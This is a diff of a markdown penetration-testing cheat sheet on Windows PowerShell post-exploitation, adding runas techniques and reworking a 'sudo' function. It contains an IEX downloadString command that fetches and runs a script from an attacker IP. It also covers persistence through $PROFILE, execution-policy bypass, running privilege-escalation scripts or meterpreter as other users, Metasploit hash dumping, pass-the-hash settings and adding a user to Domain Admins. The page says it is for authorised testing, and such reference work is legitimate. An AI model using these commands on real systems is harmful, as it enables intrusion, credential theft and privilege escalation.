@@ -100,13 +100,13 @@ Always ensure you have **explicit** permission to access any computer system **b
 
 If your are able to use `Invoke-Expresion` \(`IEX`\) this module can be imported using the following command. You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run. Notice the .ps1 extension. When using `downloadString` this will need to be a ps1 file to inject the module into memory in order to run the cmdlets.
 
-```text
+```powershell
 IEX (New-Object -TypeName Net.WebClient).downloadString("http://$attacker_ip/$script.ps1")
 ```
 
 `IEX` is blocked from users in most cases and `Import-Module` is monitored by things such as ATP. Downloading files to a target's machine is not always allowed in a penetration test. Another method to use is `Invoke-Command`. This can be done using the following format.
 
-```text
+```powershell
 Invoke-Command -ComputerName $computer -FilePath .'\$module.ps1m' -Credential (Get-Credential)
 ```
 
@@ -114,7 +114,7 @@ This will execute the file and it's contents on the remote computer.
 
 Another sneaky method would be to have the script load at the start of a new PowerShell window. This can be done by editing the `$PROFILE` file.
 
-```text
+```powershell
 Write-Verbose "Creates powershell profile for user"
 New-Item -Path $PROFILE -ItemType File -Force
 #
@@ -135,7 +135,7 @@ powershell.exe
 
 Running the code from your PowerShell script inside a function will completely bypass script execution policies.  Other code protection policies such as JEA may still stop certain cmdlets and code from running, however.
 
-```text
+```powershell
 function $function_name {
 
 #code goes here
@@ -145,29 +145,63 @@ function $function_name {
 
 Then you can re-use the code by just typing the function name.
 
-## Powershell Sudo for Windows
+## Sudo for Windows
 
-\#TODO:make it so this will take arguments, so can use like `sudo -User bob test.bat`
+There may be times when you know the credentials for another user, but can't spawn other windows. The `sudo` equivalent in PowerShell on Windows machines is the verb `RunAs`.  It is not as simple to use as `sudo`, however.  
 
-There may be times when you know the credentials for another user, but can't spawn other windows. The `sudo` equivalent in PowerShell on Windows machines is the verb `RunAs`.  It is not as simple to use as `sudo`, however.  Below is a PowerShell script that that will run a separate file as another user. You can then run a batch file, PowerShell script, or just execute a meterpreter binary as that user. The below function is to be run from a PowerShell prompt:
+### runas
 
-```text
+First run `cmdkey /list`.  If this returns entries, it means that you may able to `runas` a certain user who stored their credentials in Windows.
+
+```
+runas /savecred /user:$domain\$username $command_to_run
+```
+
+This can be used in either cmd.exe or PowerShell.
+
+### runas PowerShell 
+
+use the below PowerShell script to run commands as that user.
+
+```
+$secPassword = ConvertTo-SecureString "$password" -AsPlainText -Force
+$myCreds = New-Object System.Management.Automation.PSCredential ("$userName", $secpasswd)
+
+[System.Diagnostics.Process]::Start("$command", $myCreds.Username, $myCreds.Password, $computerName)
+```
+Needs a `password`, `username`, `command`, and `computername` specified in this example, which runs `$command` as the specified user.  
+
+# PowerShell `sudo` script
+
+https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions
+
+Below is a PowerShell script that that will run a separate file as another user. You can then run a batch file, PowerShell script, or just execute a meterpreter binary as that user. The below function is to be run from a PowerShell prompt:
+
+```powershell
 function sudo {
 
-#hard-coded $Password that can be sniffed, beware
-$pw = ConvertTo-SecureString "$Password" -AsPlainText -Force
+param(
+[Parameter (Mandatory = $true)] [String]$UserName,
+[Parameter (Mandatory = $false)] [String]$DomainName,
+[Parameter (Mandatory = $false)] [String]$Password,
+[Parameter (Mandatory = $true)] [String]$Script,
+[System.Management.Automation.PSCredential]$Credential
+)
 
-$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$DomainName\$UserName",$pw
+#hard-coded $Password can be sniffed, beware
+#$pw = ConvertTo-SecureString "$Password" -AsPlainText -Force
+#$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$DomainName\$UserName",$pw
 
-#The $script below can be any privilege escalation or reverse shell script or executable
-#TODO:make it so this will take an argument, so can use like "sudo -User bob test.bat"
-$script = "C:\Users\$UserName\AppData\Local\Temp\test.bat"
-
-Start-Process powershell -Credential $cred -ArgumentList '-NoProfile -Command &{Start-Process $script -verb RunAs}'
+<#
+Using the $Credential parameter here allows for Windows to prompt for credentials.  
+Use the above lines if a password needs to be passed in the command line.
+#>
+Start-Process Powershell -Credential $Credential -ArgumentList '-NoProfile -Command &{Start-Process $Script -verb RunAs}'
 }
-
-sudo
 ```
+
+Example: `sudo -UserName Administrator -Script C:\tmp\privesc.ps1`
+This will cause Windows to prompt for a password for the Administrator user, then run the privesc script.  Can be used to run a command rather than a script.
 
 Running this in a function will bypass Script Execution policies, though JEA may still give you trouble.
 
@@ -551,7 +585,8 @@ net group "Domain Admins" /domain
 msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE
 ```
 
-### Find admin users \(Metasploit\)
+### 
+Find admin users \(Metasploit\)
 
 ```text
 spool /tmp/enumdomainusers.txt
@@ -561,7 +596,8 @@ msf > set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
 msf > set rhosts 10.10.10.0/24
 msf > set threads 8
 msf > run
-msf> spool off
+
+msf> spool off
 ```
 
 ### Impersonate an administrator \(meterpreter\)
@@ -594,7 +630,8 @@ C:\> net group "Domain Admins" hacker /add /domain
 
 ```text
 [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('d2hvYW1p'))
- # whoami
+ 
+# whoami
 ```
 
 #### Execute a base64 payload in powershell
